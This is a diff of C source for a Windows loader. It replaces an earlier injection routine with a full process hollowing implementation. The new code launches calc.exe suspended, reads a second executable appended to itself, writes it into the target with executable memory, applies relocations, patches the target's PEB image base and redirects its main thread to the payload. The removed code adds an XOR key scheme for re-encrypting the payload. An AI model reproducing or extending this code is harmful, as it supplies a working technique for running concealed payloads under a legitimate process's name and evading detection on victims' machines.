@@ -1,10 +1,17 @@
 #include "loader.h"
 
-ULONGLONG getFirstPEFileSize(const char* peFilePath) {
+LONG getPEphysicalSize(const char* peFilePath, long address) {
     // Open the PE file
     FILE* file = fopen(peFilePath, "rb");
     if (!file) {
         fprintf(stderr, "Failed to open file\n");
+        return 0;
+    }
+
+    // Seek to the specified offset
+    if (fseek(file, (long)address, SEEK_SET) != 0) {
+        fprintf(stderr, "Failed to seek to offset: 0x%lx\n", address);
+        fclose(file);
         return 0;
     }
 
@@ -23,8 +30,8 @@ ULONGLONG getFirstPEFileSize(const char* peFilePath) {
         return 0;
     }
 
-    // Move to the NT Header
-    if (fseek(file, dosHeader.e_lfanew, SEEK_SET) != 0) {
+    // Move to the NT Header, which is located at dosHeader.e_lfanew
+    if (fseek(file, dosHeader.e_lfanew + address, SEEK_SET) != 0) {
         fprintf(stderr, "Failed to seek to NT header\n");
         fclose(file);
         return 0;
@@ -46,7 +53,7 @@ ULONGLONG getFirstPEFileSize(const char* peFilePath) {
     }
 
     // Calculate the PE file size
-    ULONGLONG fileSize = ntHeaders.OptionalHeader.SizeOfHeaders;
+    LONG fileSize = ntHeaders.OptionalHeader.SizeOfHeaders;
     for (WORD i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++) {
         IMAGE_SECTION_HEADER sectionHeader;
         if (fread(&sectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, file) != 1) {
@@ -59,331 +66,42 @@ ULONGLONG getFirstPEFileSize(const char* peFilePath) {
     }
 
     fclose(file);
-
-    printf("First PE File Size: %llu bytes\n", fileSize);
     return fileSize;
 }
 
-
-ULONGLONG getPEBasePhysicalAddress(const char* firstPEFilePath) {
-    // Get the size of the first PE file
-    ULONGLONG firstPEFileSize = getFirstPEFileSize(firstPEFilePath);
-    if (firstPEFileSize == 0) {
-        fprintf(stderr, "Failed to get PE file size\n");
-        return 0;
-    }
-
-    // The base address of the second PE will be right after the first PE
-    ULONGLONG secondPEBaseAddress = firstPEFileSize;
-
-    printf("Base physical Address of second PE: 0x%08llX\n", secondPEBaseAddress);
-
-    return secondPEBaseAddress;
-}
-
-// i might try using the commandline b64 encoded first, just to for testing purposes
-void passProcessInfo() {
-    UINT_PTR baseAddress = (UINT_PTR)GetModuleHandle(NULL);
-    if (baseAddress == 0) {
-        printf("Error: Unable to get module handle.\n");
-        return; // Exit with an error
-    }
-    printf("Base Address: 0x%llX\n", baseAddress);
-
-    // Shared Memory Structure
-    ProcessData *data = NULL;
-    HANDLE hMapFile;
-
-    // Create or open shared memory
-    hMapFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, sizeof(ProcessData), SHARED_MEMORY_NAME);
-    if (hMapFile == NULL) {
-        fprintf(stderr, "Could not create file mapping object (%ld).\n", GetLastError());
-        return;
-    }
-
-    // Map the shared memory into the process's address space
-    data = (ProcessData*)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ProcessData));
-    if (data == NULL) {
-        fprintf(stderr, "Could not map view of file (%ld).\n", GetLastError());
-        CloseHandle(hMapFile);
-        return;
-    }
-
-    // Analyze the executable to retrieve the function information
-    FunctionInfo* functions = NULL;
-    size_t numFunctions = 0;
-
-    functions = analyzeExecutable(&numFunctions);
-    if (functions == NULL || numFunctions == 0) {
-        fprintf(stderr, "No functions found or failed to analyze executable.\n");
-        return;
-    }
-    data->functions = functions;
-    data->numFunctions = numFunctions;
-
-    // Generate next decryption key
-    srand(time(NULL));
-    unsigned char nextEncryptionKey = (unsigned char)(rand() % 256);
-    data->nextEncryptionKey = nextEncryptionKey;
-
-    // Encryption key (should match the key used during encryption)
-    unsigned char encryptionKey = 0x00;
-    encryptionKey = *((unsigned char*)(baseAddress + getMetaSectionAddress(baseAddress) + getMetaSectionVirtualSize(baseAddress) - sizeof(encryptionKey)));
-
-    if (encryptionKey == 0x00) {
-        printf("Encryption Key not found.\n");
-        exit(0);
-    }
-
-    unsigned char recryptionKey = nextEncryptionKey ^ encryptionKey;
-    data->recryptionKey = recryptionKey;
-
-    // Get the current executable path
-    char executablePath[512];
-    if (GetModuleFileName(NULL, executablePath, sizeof(executablePath)) == 0) {
-        fprintf(stderr, "Error getting executable path: %ld\n", GetLastError());
-        return;
-    }
-
-    data->executablePath = executablePath;
-    printf("Current executable path: %s\n", executablePath);
-
-    // Map base address for key storage
-    UINT_PTR keyAddress = Rva2Offset((UINT_PTR)getMetaSectionAddress(baseAddress), baseAddress);
-    data->keyAddress = keyAddress;
-
-    // Close the shared memory
-    UnmapViewOfFile(data);
-    CloseHandle(hMapFile);
-}
-
-HANDLE createProcess(PPROCESS_INFORMATION pi) {
-    STARTUPINFOA si = {0};
-    
-    si.cb = sizeof(STARTUPINFOA);
-    
-    // Path to the executable (e.g., calculator)
-    LPCSTR applicationName = "C:\\Windows\\System32\\calc.exe";
-    LPCSTR commandLine = NULL;  // Optional, pass if you need arguments
-
-    // Create the process
-    BOOL success = CreateProcessA(
-        applicationName,           // Path to the executable
-        NULL,                      // Command line arguments (or NULL)
-        NULL,                      // Process security attributes (default)
-        NULL,                      // Thread security attributes (default)
-        FALSE,                     // Don't inherit handles
-        CREATE_SUSPENDED,          // DETACHED_PROCESS | CREATE_NEW_CONSOLE | CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP |
-        NULL,                      // Environment (default)
-        NULL,                      // Current directory (default)
-        &si,                       // Startup information (e.g., window size, etc.)
-        pi                         // Process information (output)
-    );
-
-    if (!success) {
-        printf("CreateProcessA failed with error code %lu\n", GetLastError());
+void* loadFileToMemory(const char* peFilePath, PLONG fileSize) {
+    // Open the file in binary read mode
+    FILE* file = fopen(peFilePath, "rb");
+    if (!file) {
+        fprintf(stderr, "Failed to open file\n");
         return NULL;
     }
 
-    printf("Process created successfully\n");
-    printf("Process ID: %lu\n", pi->dwProcessId);
+    // Get the size of the file by seeking to the end
+    fseek(file, 0, SEEK_END);
+    *fileSize = ftell(file);  // Get the current file pointer, which is the size of the file
+    fseek(file, 0, SEEK_SET);  // Reset the file pointer to the beginning
 
-    return pi->hProcess;
-}
-
-BOOL resumeProcess(HANDLE hThread) {
-    DWORD result = ResumeThread(hThread);
-
-    if (result == (DWORD)-1) {
-        printf("Failed to resume thread (Error: %lu)\n", GetLastError());
-        return FALSE;
-    }
-    return TRUE;
-}
-
-PIMAGE_NT_HEADERS getNTHeaders(LPVOID lpBaseAddress) {
-    return (PIMAGE_NT_HEADERS)((BYTE*)lpBaseAddress + ((PIMAGE_DOS_HEADER)lpBaseAddress)->e_lfanew);
-}
-
-DWORD getImageBaseForSecondPE(const char* filename) {
-    // Open the file for reading
-    HANDLE hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        printf("Failed to open file %s (Error: %lu)\n", filename, GetLastError());
-        return 0;
-    }
-
-    // Get the total size of the file
-    LARGE_INTEGER fileSize;
-    if (!GetFileSizeEx(hFile, &fileSize)) {
-        printf("Failed to get file size (Error: %lu)\n", GetLastError());
-        CloseHandle(hFile);
-        return 0;
-    }
-
-    // Allocate memory to read the file into
-    LPVOID fileData = VirtualAlloc(NULL, fileSize.QuadPart, MEM_COMMIT, PAGE_READWRITE);
-    if (fileData == NULL) {
-        printf("Failed to allocate memory for the file (Error: %lu)\n", GetLastError());
-        CloseHandle(hFile);
-        return 0;
-    }
-
-    DWORD bytesRead;
-    if (!ReadFile(hFile, fileData, fileSize.QuadPart, &bytesRead, NULL)) {
-        printf("Failed to read file (Error: %lu)\n", GetLastError());
-        VirtualFree(fileData, 0, MEM_RELEASE);
-        CloseHandle(hFile);
-        return 0;
-    }
-
-    // Close the file handle
-    CloseHandle(hFile);
-
-    // Get the NT Headers from the mapped file data
-    PIMAGE_NT_HEADERS ntHeaders = getNTHeaders(fileData + getPEBasePhysicalAddress(filename));
-    if (!ntHeaders) {
-        printf("Failed to retrieve NT Headers\n");
-        VirtualFree(fileData, 0, MEM_RELEASE);
-        return 0;
-    }
-
-    // Extract the ImageBase from the OptionalHeader section
-    DWORD imageBase = ntHeaders->OptionalHeader.ImageBase;
-
-    printf("Image Base for second PE: 0x%04lX\n", imageBase);
-
-    // Clean up and return the ImageBase
-    VirtualFree(fileData, 0, MEM_RELEASE);
-    return imageBase;
-}
-
-LPVOID loadPEFile(const char *filename, PLARGE_INTEGER peSize) {
-    // Open the file for reading
-    HANDLE hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        printf("Failed to open file %s (Error: %lu)\n", filename, GetLastError());
+    // Allocate memory to hold the file content
+    void* fileData = malloc(*fileSize);
+    if (!fileData) {
+        fprintf(stderr, "Memory allocation failed\n");
+        fclose(file);
         return NULL;
     }
 
-    // Get the total size of the file
-    LARGE_INTEGER fileSize;
-    if (!GetFileSizeEx(hFile, &fileSize)) {
-        printf("Failed to get file size (Error: %lu)\n", GetLastError());
-        CloseHandle(hFile);
+    // Read the entire file into memory
+    if (fread(fileData, 1, *fileSize, file) != *fileSize) {
+        fprintf(stderr, "Failed to read the entire file\n");
+        free(fileData);
+        fclose(file);
         return NULL;
     }
 
-    printf("File size: %lld bytes\n", fileSize.QuadPart);
+    // Close the file after reading
+    fclose(file);
 
-    // Get the physical base address (i.e., the offset for the second PE)
-    ULONGLONG offset = getPEBasePhysicalAddress(filename);  // This function should return the offset based on the first PE
-
-    // Ensure that the offset doesn't exceed the file size
-    if (offset >= fileSize.QuadPart) {
-        printf("The offset exceeds the file size (Offset: %llu, FileSize: %llu)\n", offset, fileSize.QuadPart);
-        CloseHandle(hFile);
-        return NULL;
-    }
-
-    printf("File Offset: 0x%llX\n", offset);
-
-    // Calculate the size of the second PE by subtracting the offset from the file size
-    peSize->QuadPart = fileSize.QuadPart - offset;
-
-    // Allocate memory for the second PE
-    LPVOID buffer = VirtualAlloc(NULL, peSize->QuadPart, MEM_COMMIT, PAGE_READWRITE);
-    if (buffer == NULL) {
-        printf("Failed to allocate memory (Error: %lu)\n", GetLastError());
-        CloseHandle(hFile);
-        return NULL;
-    }
-
-    printf("Second PE File Size: %lld bytes\n", peSize->QuadPart);
-
-    // Move the file pointer to the location of the second PE using the calculated offset
-    LONG highOffset = (LONG)(offset >> 32);  // Cast directly to LONG for high part
-    LONG lowOffset = (LONG)(offset & 0xFFFFFFFF);  // Cast directly to LONG for low part
-
-    if (SetFilePointer(hFile, lowOffset, &highOffset, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
-        printf("Failed to seek to PE offset (Error: %lu)\n", GetLastError());
-        VirtualFree(buffer, 0, MEM_RELEASE);
-        CloseHandle(hFile);
-        return NULL;
-    }
-
-    // Read the second PE into the allocated memory
-    DWORD bytesRead;
-    if (!ReadFile(hFile, buffer, peSize->QuadPart, &bytesRead, NULL)) {
-        printf("Failed to read second PE file (Error: %lu)\n", GetLastError());
-        VirtualFree(buffer, 0, MEM_RELEASE);
-        CloseHandle(hFile);
-        return NULL;
-    }
-
-    // Close the file handle
-    CloseHandle(hFile);
-
-    // Return the buffer containing the second PE
-    return buffer;
-}
-
-BOOL unmapProcess(HANDLE hProcess, LPVOID allocatedMemory) {
-    if (allocatedMemory != NULL) {
-        if (VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE)) {
-            return TRUE;
-        } else {
-            printf("Failed to unmap memory in target process (Error: %lu)\n", GetLastError());
-        }
-    }
-    return FALSE;
-}
-
-// MUST HAVE FREE MEMORY AT OFFSET
-LPVOID allocateMemoryInTarget(HANDLE hProcess, PLARGE_INTEGER peSize, LPVOID peBase) {
-    LPVOID allocatedMemory = VirtualAllocEx(hProcess, peBase, peSize->QuadPart, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (allocatedMemory == NULL) {
-        printf("Failed to allocate memory in target process (Error: %lu)\n", GetLastError());
-    }
-    return allocatedMemory;
-}
-
-BOOL writePEToProcess(HANDLE hProcess, LPVOID targetMemory, LPVOID sourceMemory, PLARGE_INTEGER peSize) {
-    SIZE_T bytesWritten;
-    if (!WriteProcessMemory(hProcess, targetMemory, sourceMemory, peSize->QuadPart, &bytesWritten)) {
-        printf("Failed to write to target process memory (Error: %lu)\n", GetLastError());
-        return FALSE;
-    }
-    return TRUE;
-}
-
-BOOL setMemoryProtection(HANDLE hProcess, LPVOID pMemory, PLARGE_INTEGER peSize) {
-    DWORD oldProtect;
-    if (!VirtualProtectEx(hProcess, pMemory, peSize->QuadPart, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-        printf("Failed to change memory protection (Error: %lu)\n", GetLastError());
-        return FALSE;
-    }
-    return TRUE;
-}
-
-BOOL setThreadContextToEntryPoint(HANDLE hThread, LPVOID entryPoint) {
-    CONTEXT context;
-    context.ContextFlags = CONTEXT_FULL;
-
-    if (!GetThreadContext(hThread, &context)) {
-        printf("Failed to get thread context (Error: %lu)\n", GetLastError());
-        return FALSE;
-    }
-
-    // Set the EIP or RIP to the entry point of the PE
-    context.Rip = (UINT_PTR)entryPoint; // x86, change to context.Rip for x64
-
-    if (!SetThreadContext(hThread, &context)) {
-        printf("Failed to set thread context (Error: %lu)\n", GetLastError());
-        return FALSE;
-    }
-
-    return TRUE;
+    return fileData;
 }
 
 void fixIAT(UINT_PTR baseAddress) {
@@ -410,91 +128,292 @@ void fixIAT(UINT_PTR baseAddress) {
     }
 }
 
-BOOL injectAppendedPEIntoCalc() {
-    // Get the current executable's path
-    char currentExePath[MAX_PATH];
-    if (GetModuleFileNameA(NULL, currentExePath, MAX_PATH) == 0) {
-        printf("Failed to get current executable path (Error: %lu)\n", GetLastError());
-        return FALSE;
+#define RELOC_32BIT_FIELD 3
+#define RELOC_64BIT_FIELD 10
+
+typedef struct _BASE_RELOCATION_ENTRY {
+    WORD Offset : 12;
+    WORD Type: 4;
+} BASE_RELOCATION_ENTRY;
+
+IMAGE_NT_HEADERS* get_nt_hdrs(BYTE *pe_buffer)
+{
+    if (pe_buffer == NULL) return NULL;
+
+    IMAGE_DOS_HEADER *idh = (IMAGE_DOS_HEADER*)pe_buffer;
+    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
+        return NULL;
+    }
+    const LONG kMaxOffset = 1024;
+    LONG pe_offset = idh->e_lfanew;
+    if (pe_offset > kMaxOffset) return NULL;
+
+    IMAGE_NT_HEADERS *inh = (IMAGE_NT_HEADERS *)((BYTE*)pe_buffer + pe_offset);
+    return inh;
+}
+
+IMAGE_DATA_DIRECTORY* get_pe_directory64(PVOID pe_buffer, DWORD dir_id)
+{
+    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) {       
+        return NULL;
+    }
+        
+    //fetch relocation table from current image:
+    PIMAGE_NT_HEADERS nt_headers = get_nt_hdrs((BYTE*) pe_buffer);
+    if (nt_headers == NULL) {       
+        return NULL;
     }
 
-    // Load the appended PE from the current executable
-    LARGE_INTEGER peSize;
-    LPVOID appendedPE = loadPEFile(currentExePath, &peSize);
-    if (appendedPE == NULL) {
-        printf("Failed to load appended PE from %s\n", currentExePath);
+    IMAGE_DATA_DIRECTORY* peDir = &(nt_headers->OptionalHeader.DataDirectory[dir_id]);
+    
+    if (((PVOID) ((DWORD64) peDir->VirtualAddress)) == NULL) {          
+        return NULL;
+    }   
+    
+    return peDir;
+}
+
+BOOL apply_reloc_block64(BASE_RELOCATION_ENTRY *block, SIZE_T entriesNum, DWORD page, ULONGLONG oldBase, ULONGLONG newBase, PVOID modulePtr)
+{
+    DWORD *relocateAddr32;
+    ULONGLONG *relocateAddr64;
+    BASE_RELOCATION_ENTRY* entry = block;
+    SIZE_T i = 0;
+    for (i = 0; i < entriesNum; i++) {
+        DWORD offset = entry->Offset;
+        DWORD type = entry->Type;
+        
+        if (entry == NULL || type == 0) {
+            break;
+        }
+                
+        switch(type) {
+            case RELOC_32BIT_FIELD:
+                relocateAddr32 = (DWORD*) ((ULONG_PTR) modulePtr + page + offset);
+                (*relocateAddr32) = (DWORD) (*relocateAddr32) - oldBase + newBase;
+                entry = (BASE_RELOCATION_ENTRY*)((ULONG_PTR) entry + sizeof(WORD)); 
+                break;
+            case RELOC_64BIT_FIELD:
+                relocateAddr64 = (ULONGLONG*) ((ULONG_PTR) modulePtr + page + offset);
+                (*relocateAddr64) = ((ULONGLONG) (*relocateAddr64)) - oldBase + newBase;
+                entry = (BASE_RELOCATION_ENTRY*)((ULONG_PTR) entry + sizeof(WORD)); 
+                break;          
+            default:
+                printf("Not supported relocations format at %d: %lu\n", (int) i, type);
+                return FALSE;
+        }                               
+                
+    }
+    return TRUE;        
+}
+
+
+BOOL apply_relocations64(ULONGLONG newBase, ULONGLONG oldBase, PVOID modulePtr)
+{
+    IMAGE_DATA_DIRECTORY* relocDir = get_pe_directory64(modulePtr, IMAGE_DIRECTORY_ENTRY_BASERELOC);
+    if (relocDir == NULL) {
+        printf("Cannot relocate - application have no relocation table!\n");
         return FALSE;
     }
+    DWORD maxSize = relocDir->Size;
+    DWORD relocAddr = relocDir->VirtualAddress;
 
-    // Create the target process (calc.exe) in a suspended state
-    PROCESS_INFORMATION pi = {0};
-    HANDLE hProcess = createProcess(&pi);
-    if (hProcess == NULL) {
-        printf("Failed to create calc.exe process\n");
-        return FALSE;
+    IMAGE_BASE_RELOCATION* reloc = NULL;
+
+    DWORD parsedSize = 0;
+    while (parsedSize < maxSize) {
+        reloc = (IMAGE_BASE_RELOCATION*)(relocAddr + parsedSize + (ULONG_PTR) modulePtr);
+        parsedSize += reloc->SizeOfBlock;
+        
+        if ((((ULONGLONG*) ((ULONGLONG) reloc->VirtualAddress)) == NULL) || (reloc->SizeOfBlock == 0)) {
+            continue;
+        }
+        
+        size_t entriesNum = (reloc->SizeOfBlock - 2 * sizeof(DWORD))  / sizeof(WORD);
+        DWORD page = reloc->VirtualAddress;
+
+        BASE_RELOCATION_ENTRY* block = (BASE_RELOCATION_ENTRY*)((ULONG_PTR) reloc + sizeof(DWORD) + sizeof(DWORD));
+        if (apply_reloc_block64(block, entriesNum, page, oldBase, newBase, modulePtr) == FALSE) {
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+void hollowing() {
+    // 1. Create the target process in a suspended state
+    STARTUPINFOA tStartupInformation = {0};
+    PROCESS_INFORMATION tProcessInformation = {0};
+    
+    tStartupInformation.cb = sizeof(STARTUPINFOA);
+    
+    // Path to the executables
+    char getPath[MAX_PATH];
+    DWORD result = GetModuleFileNameA(NULL, getPath, MAX_PATH);
+    LPCSTR hName = (LPCSTR)getPath;
+    LPCSTR tName = "C:\\Windows\\System32\\calc.exe";
+
+    // Create the process
+    BOOL success = CreateProcessA(
+        tName,
+        NULL,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_SUSPENDED, // DETACHED_PROCESS | CREATE_NEW_CONSOLE | CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP |
+        NULL,
+        NULL,
+        &tStartupInformation,
+        &tProcessInformation
+    );
+
+    if (!success) {
+        printf("CreateProcessA failed with error code %lu\n", GetLastError());
+        return;
     }
 
-    // Allocate memory in the target process
-    DWORD peBase = getImageBaseForSecondPE(currentExePath);
-    LPVOID allocatedMemory = allocateMemoryInTarget(hProcess, &peSize, (LPVOID)peBase);
-    if (allocatedMemory == NULL) {
-        printf("Failed to allocate memory in calc.exe\n");
-        CloseHandle(hProcess);
-        return FALSE;
+    printf("Process created successfully\n");
+    printf("Process ID: %lu\n", tProcessInformation.dwProcessId);
+
+
+
+    // 2. Retrieve the target process context and read the ImageBase
+    long firstPEFileSize = getPEphysicalSize(hName, 0);
+    long secondPEFileSize = getPEphysicalSize(hName, firstPEFileSize);
+    long PEFileSize = firstPEFileSize + secondPEFileSize;
+    printf("File Size of PE1: %08lu \tFile Size of PE2: %08lu\n", firstPEFileSize, secondPEFileSize);
+    printf("Total File Size of PE: %08lu\n", PEFileSize);
+    void* file = loadFileToMemory(hName, &PEFileSize);
+    DWORD64 otImageBase;
+    DWORD64 desiredPayloadImageBase;
+
+    CONTEXT tContext;
+    tContext.ContextFlags = CONTEXT_FULL;
+
+    success = GetThreadContext(tProcessInformation.hThread, (LPCONTEXT) &tContext);
+
+    if(!success) {
+        printf("GetThreadContext failed with error code %lu\n", GetLastError());
+        free(file);
+        return;
     }
 
-    // Write the PE to the allocated memory in the target process
-    if (!writePEToProcess(hProcess, allocatedMemory, appendedPE, &peSize)) {
-        printf("Failed to write PE to calc.exe\n");
-        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
+    PIMAGE_DOS_HEADER payloadDosHeader = (PIMAGE_DOS_HEADER)(file + firstPEFileSize);
+    PIMAGE_NT_HEADERS payloadNtHeader = (PIMAGE_NT_HEADERS) ((BYTE *) payloadDosHeader + payloadDosHeader->e_lfanew);
+
+    // Patch payload subsystem to avoid crashes
+    payloadNtHeader->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
+
+    success = ReadProcessMemory(tProcessInformation.hProcess, (LPCVOID) (tContext.Rdx + 16), (LPVOID) (&otImageBase), sizeof(DWORD64), NULL);
+
+    if(!success) {
+        printf("ReadProcessMemory failed with error code %lu\n", GetLastError());
+        free(file);
+        return;
     }
 
-    // Set memory protection for the allocated memory in calc.exe
-    if (!setMemoryProtection(hProcess, allocatedMemory, &peSize)) {
-        printf("Failed to set memory protection in calc.exe\n");
-        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
-    }
+    printf("Old target process image base is 0x%llX\n", otImageBase);
 
-    // Get the main thread of the target process
-    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pi.dwThreadId);
-    if (hThread == NULL) {
-        printf("Failed to open main thread of calc.exe (Error: %lu)\n", GetLastError());
-        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
-    }
+    desiredPayloadImageBase = payloadNtHeader->OptionalHeader.ImageBase;
+    printf("Desired image base of payload is 0x%llX\n", payloadNtHeader->OptionalHeader.ImageBase); 
 
-    // Set the thread context to start executing from the entry point of the injected PE
-    PIMAGE_NT_HEADERS ntHeaders = getNTHeaders(appendedPE);
-    LPVOID entryPoint = (LPVOID)(ntHeaders->OptionalHeader.AddressOfEntryPoint + (UINT_PTR)allocatedMemory);
-    if (!setThreadContextToEntryPoint(hThread, entryPoint)) {
-        printf("Failed to set thread context to entry point in calc.exe\n");
-        CloseHandle(hThread);
-        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
-    }
 
+
+    // 3. Unmap View of calc Process... probably not a good idea. it's virtual memory, but i still don't want to randomly unmap a random section
     /*
-    // Resume the thread in the target process (calc.exe)
-    if (!resumeProcess(hThread)) {
-        printf("Failed to resume thread in calc.exe\n");
-        CloseHandle(hThread);
-        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
-    }
+    NtUnmapViewOfSection(
+        IN HANDLE               ProcessHandle,
+        IN PVOID                BaseAddress );
     */
 
-    // Cleanup
-    CloseHandle(hThread);
-    VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
-    CloseHandle(hProcess);
 
-    printf("Appended PE successfully injected and executed in calc.exe\n");
-    return TRUE;
+
+    // 4. Allocate memory for the payload
+    DWORD64 newTargetImageBase;
+    newTargetImageBase = (DWORD64) VirtualAllocEx(tProcessInformation.hProcess, NULL, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    printf("New memory region has size 0x%lX bytes, at address 0x%llX.\n", payloadNtHeader->OptionalHeader.SizeOfImage, newTargetImageBase);
+
+    payloadNtHeader->OptionalHeader.ImageBase = newTargetImageBase;
+    printf("Adjusted OptionalHeader.ImageBase in payload to point to the actually allocated memory in target process.\n");
+
+
+
+    // 5. Copy payload headers and sections to allocated memory
+    LPVOID localPayloadCopy;
+    PIMAGE_SECTION_HEADER payloadSectionHeader;
+    localPayloadCopy = VirtualAlloc(NULL, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(localPayloadCopy, file + firstPEFileSize, payloadNtHeader->OptionalHeader.SizeOfHeaders);
+    printf("Wrote payload headers into local copy.\n");
+
+    for(int i = 0; i < payloadNtHeader->FileHeader.NumberOfSections; i++) {
+        payloadSectionHeader = (PIMAGE_SECTION_HEADER) ((BYTE *) payloadNtHeader + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
+        memcpy((BYTE *) localPayloadCopy + payloadSectionHeader->VirtualAddress, (BYTE *) file + firstPEFileSize + payloadSectionHeader->PointerToRawData, payloadSectionHeader->SizeOfRawData);
+        printf("Wrote section %d to local copy, virtual address offset of section is 0x%lX.\n", i, payloadSectionHeader->VirtualAddress);      
+    }
+
+
+
+    // 6. Apply relocations on the local payload copy
+    if(newTargetImageBase != desiredPayloadImageBase) {
+        printf("Payload not mapped at desired image base, applying relocations...\n");
+        if(apply_relocations64((ULONGLONG) newTargetImageBase, (ULONGLONG) desiredPayloadImageBase, localPayloadCopy) == FALSE) {
+            printf("Applying relocations to local copy failed.\n");
+            return;
+        } else {
+            printf("Applied relocations to local payload copy.\n");
+        }
+    } else {
+        printf("Image is at desired base, skipping relocations.\n");
+    } // do i need to fix iat here? we'll see
+
+
+
+    // 7. Writing the payload into the target process
+    success = WriteProcessMemory(tProcessInformation.hProcess, (LPVOID) newTargetImageBase, localPayloadCopy, payloadNtHeader->OptionalHeader.SizeOfImage, NULL);
+    if(success == 0) {
+        printf("Failed to write local payload copy into target process.\n");
+        return;
+    } else {
+        printf("Wrote local payload copy into target process.\n");
+    }
+
+
+
+    // 8. Adjusting the target's PEB (Image Base, Thread Context)
+    success = WriteProcessMemory(tProcessInformation.hProcess, (LPVOID) (tContext.Rdx + 16), (LPCVOID) &newTargetImageBase, sizeof(DWORD64), NULL);
+    if(success == 0) {
+        printf("Failed to fix target image base in PEB.\n");
+        return;
+    } else { 
+        printf("Fixed target image base in PEB to 0x%llX\n", newTargetImageBase);
+    }
+
+    tContext.Rcx = newTargetImageBase + payloadNtHeader->OptionalHeader.AddressOfEntryPoint;
+    if(!SetThreadContext(tProcessInformation.hThread, &tContext)) {
+        printf("Setting thread context for target main thread failed.\n");
+        return;
+    } else {
+        printf("Set thread context for target main thread. New entry point is 0x%llX.\n", tContext.Rcx);
+    }
+
+
+
+    // 9. Cleanup local memory
+    free(file);
+    VirtualFree(localPayloadCopy, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_FREE);
+
+
+
+    // 10. Resume target main thread
+    if(ResumeThread(tProcessInformation.hThread) == -1) {
+        printf("Failed to resume target main thread.\n");
+    } else {
+        printf("Resumed target main thread.\n");
+    }
+
+
+
+    // 11. Close local handles or exit program entirely for the kernel to clean them
+    CloseHandle(tProcessInformation.hThread);
+    CloseHandle(tProcessInformation.hProcess);
 }
